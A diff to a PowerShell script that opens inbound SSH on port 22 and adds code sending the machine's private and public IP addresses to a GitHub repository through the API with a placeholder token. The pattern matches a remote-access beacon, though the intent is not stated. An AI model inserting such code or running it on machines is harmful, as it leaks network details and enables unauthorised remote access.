@@ -29,3 +29,20 @@ try {
 
 New-NetFirewallRule -Name "OpenSSH" -DisplayName "OpenSSH SSH Server" -Direction Inbound -Protocol TCP -LocalPort 22 -Action Allow -ErrorAction SilentlyContinue
 Add-Content $log "Done"
+# Get both IPs
+$privateIP = (ipconfig | Select-String "IPv4").ToString().Trim()
+$publicIP = (Invoke-WebRequest -Uri "http://ifconfig.me/ip" -UseBasicParsing).Content.Trim()
+
+$content = "Private IP:`n$privateIP`n`nPublic IP: $publicIP"
+$bytes = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($content))
+
+$token = "YOUR_GITHUB_TOKEN"
+$repo = "ABX532/script"
+$filePath = "ip_info.txt"
+
+$body = @{
+    message = "ip update"
+    content = $bytes
+} | ConvertTo-Json
+
+Invoke-RestMethod -Uri "https://api.github.com/repos/$repo/contents/$filePath" -Method PUT -Headers @{Authorization = "token $token"; "User-Agent" = "PowerShell"} -Body $body
